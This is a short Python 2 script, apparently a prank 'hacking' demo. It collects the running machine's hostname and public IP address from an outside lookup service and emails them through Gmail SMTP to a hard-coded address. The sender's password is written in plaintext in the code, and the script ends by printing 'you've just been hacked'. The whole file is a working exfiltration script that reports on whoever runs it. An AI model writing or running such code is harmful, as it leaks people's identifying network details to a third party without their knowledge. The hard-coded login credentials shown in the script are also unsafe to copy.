from urllib2 import urlopen
import os
import socket
import smtplib

print("Hacking in progress")

sender = "xxleethaxorsxx@gmail.com"
receivers = ["xxleethaxorsxx@gmail.com"]

my_ip = urlopen('http://ip.42.pl/raw').read()

message = socket.gethostname() + ": " + my_ip

smtpObj = smtplib.SMTP('smtp.gmail.com', '587')
smtpObj.ehlo()
smtpObj.starttls()
smtpObj.login(sender, "gitgudson")
smtpObj.sendmail(sender, receivers, message)
smtpObj.quit()

print("Congrats, you've just been hacked")
